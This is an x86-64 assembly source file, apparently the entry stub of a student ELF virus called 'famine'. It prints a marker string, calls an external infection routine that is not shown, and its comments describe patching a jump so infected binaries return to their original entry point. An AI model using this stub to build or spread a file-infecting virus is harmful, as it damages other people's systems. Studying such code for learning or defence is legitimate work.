bits 64

section .text
    global    _start
    extern    famine

_start:
    push    rax
    push    rbx
    push    rcx
    push    rdx
    push    rsp
    
affichage:
    push    0x0a2e2e2e    ;    ...\n
    push    0x59444f4f    ;    OODY
    push    0x572e2e2e    ;    ...W

    ;    write(stderr, "...WOODY...\n", 20)
    mov        rax, 1        ;    syscall number
    mov        rdi, 2        ;    stderr
    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
    mov        rdx, 20        ;    20
    syscall

    ;    Clear la stack pour pas avoir de problemes
    pop    rax
    pop    rax
    pop    rax

_virus:
    call    famine    
    pop        rsp
    pop        rdx
    pop        rcx
    pop        rbx
    pop        rax
    jmp    0x4        ; Does nothing but is the "lunch-pad" to the real entrypoint.
                ; The "0x4" value will be changed on infected binaries to 
                ; jump back to the program execution    
    mov    rax, 60
    mov    rdi, 0
    syscall        ; exit(0)

section .note.GNU-stack noalloc noexec nowrite progbits